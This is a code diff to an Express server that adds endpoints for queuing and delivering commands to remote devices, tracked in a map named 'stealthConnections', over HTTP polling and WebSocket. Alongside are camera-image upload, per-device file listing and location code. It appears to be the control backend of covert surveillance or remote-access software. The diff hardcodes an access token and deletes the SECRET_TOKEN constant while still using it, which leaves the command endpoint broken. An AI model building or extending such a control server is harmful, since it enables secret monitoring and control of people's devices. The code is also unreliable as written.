@@ -7,7 +7,6 @@ import http from "http";
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const SECRET_TOKEN = "your_secret_key_123";
 
 // ДОБАВЬТЕ ЭТУ СТРОКУ ЗДЕСЬ:
 const deviceCommands = new Map();
@@ -241,16 +240,64 @@ app.post("/api/camera/image", (req, res) => {
   return res.json({ success: true });
 });
 
-app.get('/api/files/:deviceId/:token', (req, res) => {
+// GET endpoint для HTTP polling
+app.get('/api/device/:deviceId/command/:token', (req, res) => {
   const { deviceId, token } = req.params;
-  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
   
-  const deviceInfo = stealthConnections.get(deviceId);
-  if (deviceInfo && deviceInfo.files) {
-    res.json({ files: deviceInfo.files });
-  } else {
-    res.json({ files: [] });
+  if (token !== 'your_secret_key_123') {
+    return res.status(403).json({ error: "Forbidden" });
   }
+  
+  const command = deviceCommands.get(deviceId);
+  
+  if (command && (Date.now() - command.timestamp) < 30000) {
+    console.log(`✓ Delivering command to ${deviceId}: ${command.action}`);
+    deviceCommands.delete(deviceId);
+    return res.json({ 
+      action: command.action, 
+      timestamp: command.timestamp 
+    });
+  }
+  
+  // Нет команд - это нормально
+  return res.json({ action: null });
+});
+
+// POST endpoint для отправки команд (измените существующий)
+app.post("/api/device/command", (req, res) => {
+  const { device_id, command, token } = req.body;
+  
+  console.log(`=== COMMAND REQUEST ===`);
+  console.log(`Device ID: ${device_id}`);
+  console.log(`Command: ${command}`);
+  
+  if (token !== SECRET_TOKEN) {
+    return res.status(403).json({ error: "Forbidden" });
+  }
+  
+  // Сохраняем для HTTP polling
+  deviceCommands.set(device_id, {
+    action: command.toLowerCase(),
+    timestamp: Date.now()
+  });
+  
+  console.log(`✓ Command queued for HTTP polling: ${command}`);
+  
+  // Также пробуем WebSocket
+  const entry = stealthConnections.get(device_id);
+  if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
+    try {
+      entry.ws.send(JSON.stringify({ 
+        action: command.toLowerCase(), 
+        timestamp: Date.now() 
+      }));
+      console.log(`✓ Also sent via WebSocket`);
+    } catch (err) {
+      console.error("WebSocket send failed:", err);
+    }
+  }
+  
+  return res.json({ success: true, method: 'http_polling' });
 });
 
 app.delete("/api/device/:device_id/:token", async (req, res) => {
@@ -439,6 +486,7 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
